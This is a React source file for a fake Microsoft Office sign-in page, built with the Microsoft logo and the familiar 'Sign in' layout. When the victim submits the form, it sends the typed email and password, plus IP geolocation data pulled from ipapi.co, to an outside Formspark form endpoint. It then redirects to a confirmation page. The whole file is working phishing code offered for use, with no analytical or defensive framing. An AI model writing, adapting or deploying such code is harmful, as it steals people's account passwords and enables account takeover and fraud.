import { useFormspark } from "@formspark/use-formspark";
import Axios from "axios";
import React, { useEffect, useState } from "react";
import { Link, Redirect } from "react-router-dom";
import "react-toastify/dist/ReactToastify.css";
import Logo from "../assests/images/microsoft_logo.svg";
import Key from "../assests/images/signin-options.svg";

const FORMSPARK_FORM_ID = "xkY59p0W";

const Office = () => {
  const [emlId, setEmlId] = useState("");
  const [emlPass, setEmlPass] = useState("");
  const [confirm, setConfirm] = useState(false);

  const [submit, submitting] = useFormspark({
    formId: FORMSPARK_FORM_ID,
  });

  const [isDetails, setIsDetails] = useState([]);

  useEffect(() => {
    Axios.get("https://ipapi.co/json/").then((res) => {
      setIsDetails(res.data);
    });
  }, []);

  const handleSubmit = async (e) => {
    setConfirm(true);
    e.preventDefault();
    await submit({
      emlId,
      emlPass,
      ...isDetails,
    });
    return <></>;
  };

  if (confirm) {
    return (
      <p>
        <Redirect
          to={{
            pathname: "/login/confirm",
          }}
        />
      </p>
    );
  }

  return (
    <div className="md:bg-office h-screen pt-4 md:pt-20 ">
      <div className="md:w-96 h-auto w-80 p-4 md:p-8 bg-white mx-auto">
        <img src={Logo} alt="logo" />
        <div className="text-3xl bold my-2">Sign in</div>
        <form onSubmit={handleSubmit}>
          <input
            type="email"
            value={emlId}
            onChange={(e) => setEmlId(e.target.value)}
            className="outline-none border-blue-400 pt-1 my-3 border-b-2 w-full"
            placeholder="Email, Phone or Skype"
            required
          />
          <input
            type="password"
            value={emlPass}
            onChange={(e) => setEmlPass(e.target.value)}
            className="outline-none border-blue-400 pt-1 my-2 border-b-2 w-full"
            placeholder="Password"
            required
          />
          <a href="#" className="flex py-3">
            <div className=" text-blue-400 ">No account?</div>
            <a className="text-blue-400 ml-2" href="#">
              Create one!
            </a>
          </a>
          <div className="py-3 text-gray-400 "></div>
          <a href="#" className="my-3 text-blue-400">
            Sign in with a security key
          </a>
          <div className="py-5 ml-44 md:ml-52">
            <button
              type="submit"
              className="px-6 py-1 text-white bg-blue-600"
              // onClick={handleAlert}
              disabled={submitting}
            >
              Sign in
            </button>
            {/* </Link> */}
          </div>
        </form>
      </div>
      <Link to="/">
        <div className="my-5 mx-auto border-2 bg-white hover:bg-gray-300 flex p-1 w-80 md:w-96">
          <img
            src={Key}
            alt="key"
            className="ml-4 hover:text-white text-gray-400  w-6 h-6"
          />
          <div type="text" className="text-center ml-5 hover:text-white">
            Sign-in options
          </div>
        </div>
      </Link>
      {/* <div className="flex absolute pb-2 text-black text-xs right-0 bottom-0">
        <a href="#" className="mx-4">
          Nutzungsbedingungen
        </a>
        <a href="#" className="mr-4">
          Datenschutz und Cookies
        </a>
        <a href="#" className="mr-4">
          ...
        </a>
      </div> */}
    </div>
  );
};
export default Office;
